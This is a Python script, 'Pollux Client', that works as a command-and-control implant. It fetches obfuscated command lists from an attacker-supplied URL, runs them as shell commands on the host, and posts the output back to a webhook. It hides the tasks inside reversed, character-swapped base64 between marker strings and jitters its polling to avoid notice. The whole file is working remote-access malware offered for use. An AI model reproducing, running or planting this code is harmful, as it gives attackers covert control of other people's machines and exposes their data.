#!/usr/bin/env python3

from json import loads,dumps
dumper=dumps
loader=loads
from base64 import b64decode,b64encode
def encoder(string): return b64encode(string).replace(b'=',b'.').replace(b'+',b'-').replace(b'/',b'_')[::-1]
def decoder(string): return b64decode( string[::-1].replace(b'.',b'=').replace(b'-',b'+').replace(b'_',b'/') )
matchMark=b'lS6c2aT' # Using palindrome strings will result in unforeseeable matching issues


import urllib.request as req
from time import sleep
from threading import Thread
from random import random
import os,re,argparse
encoding=__import__('locale').getpreferredencoding()

class Polluxer:

    def __init__(s,matchMark,cmdGet,echoGet):
        s.matchMark=matchMark
        s.updateMark='' # then changed by update
        s.pollingInterval=20 # then changed by update
        s.cmdGet=cmdGet
        s.echoGet=echoGet
        s.tasks={'updateMark':''} # then changed by update
        s.initResult={} # then changed by update

    # run command list.
    @staticmethod
    def read(aCmd,pipe,resultList):
        try:
            output=pipe.buffer.read()
            try: output=output.decode(encoding)
            except UnicodeDecodeError: output=output.hex()
            if output: reply=[aCmd,output]
            else: reply=[aCmd,"command no echo."]
            resultList.append(reply)
        except Exception as e:
            resultList.append( [aCmd,f"PolluxerError: {str(e)} "] )
        return None
    def runTasks(s,tasks):
        cmds=tasks['cmd']
        if 'timeout' in tasks:
            timeout=float( tasks['timeout'] )
            if timeout<0.2: timeout=0.2 # Limit to at least 0.2 or directly annotate the line.
        result=[]
        for each in cmds:
            aPipe=os.popen(each)
            t=Thread(target=Polluxer.read,args=(each,aPipe,result))
            t.start()
            t.join(timeout=timeout)
            if t.is_alive():
                result.append( [each,f"NoEcho: cmd '{each}' is running."] )
            else:
                aPipe.close()
        return result

    # receive,dump,return command.
    def updateCmd(s):
        try:
            recv=req.urlopen(s.cmdGet).read()
            pattern=re.escape(s.matchMark)+rb'(.*?)'+re.escape(s.matchMark[::-1])
            matches=re.findall(pattern,recv)
            if matches:
                s.tasks=loader(decoder( matches[0] ))
                if 'pollingInterval' in s.tasks:
                    s.pollingInterval=float( s.tasks['pollingInterval'] )
                    if s.pollingInterval<3.0: s.pollingInterval=3.0 # Limit to at least 3.0 or directly annotate the line.
                return {'status':1}
            else:
                return {'status':0,'error':'Unable to obtain a match.'}
        except Exception as e:
            return {'status':0,'error':str(e)}

    # main
    def mian(s):
        # first run
        result=s.updateCmd()
        if result['status']:
            s.initResult['getInit']=s.tasks['init']
            s.initResult['initResult']=s.runTasks(s.tasks['init'])
            s.updateMark=s.tasks['updateMark']
            s.reply(s.initResult)
        else:
            s.reply(result)

        # polling
        while True:
            sleep(s.pollingInterval*round((0.5-random())/3+1,3)) # *[0.834,1.166]
            result=s.updateCmd()
            if s.updateMark!=s.tasks['updateMark']:
                if result['status']:
                    s.checkTasks()
                else:
                    s.updateMark=s.tasks['updateMark']
                    s.pollingInterval=20
                    s.reply(result)

    def checkTasks(s):
        tasksResult={}
        tasksResult['initResult']=s.runTasks(s.tasks['init'])
        s.updateMark=s.tasks['updateMark']
        s.reply(tasksResult)


    def reply(s,data):
        #data: JSON-serializable data
        try:
            data=matchMark+encoder( dumper(data).encode() )+matchMark[::-1]
            req.urlopen(s.echoGet,data=data)
        except Exception as e:
            print(f"Reply failed:{e}")
            print(data)



if __name__=='__main__':

    parser=argparse.ArgumentParser(description='Pollux Client')
    parser.add_argument('--cmdget',required=True,help='Get the command to be executed.')
    parser.add_argument('--echoget',required=True,help='Return the echo of the command.')

    args=parser.parse_args()
    cmdGet=args.cmdget
    echoGet=args.echoget

    '''
    cmdGet='http://localhost:5201/getcmd'
    echoGet='http://localhost:5201/webhook'
    '''
    polluxer=Polluxer(matchMark,cmdGet,echoGet)
    polluxer.mian()





